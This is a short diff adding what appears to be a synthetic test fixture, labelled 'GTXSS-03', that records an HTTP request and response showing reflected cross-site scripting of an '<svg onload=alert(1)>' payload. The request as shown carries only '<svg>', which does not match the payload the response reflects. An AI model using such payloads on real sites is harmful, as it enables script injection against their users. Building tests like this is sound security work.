@@ -1,0 +1,7 @@
+GET /reply?msg=%3Csvg%3E HTTP/1.1
+Host: svc-shop:8001
+
+--- response ---
+=> 200
+
+<html>reply /reply?msg=%3Csvg%20onload%3Dalert%281%29%3E GTXSS-03 synthetic reflected xss</html>
